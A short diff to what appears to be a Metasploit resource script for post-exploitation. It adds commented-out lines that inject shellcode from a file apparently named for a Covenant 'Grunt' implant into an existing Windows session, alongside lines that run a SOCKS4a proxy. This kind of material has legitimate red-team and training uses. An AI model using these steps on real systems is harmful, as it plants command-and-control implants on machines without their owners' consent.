@@ -15,3 +15,11 @@ exploit -j
 use auxiliary/server/socks_proxy
 set VERSION 4a
 exploit -j
+
+
+#INJECT
+#use post/windows/manage/shellcode_inject
+#sessions
+#set SESSION 1
+#set SHELLCODE /tmp/HTTPGrunt.bin
+#run
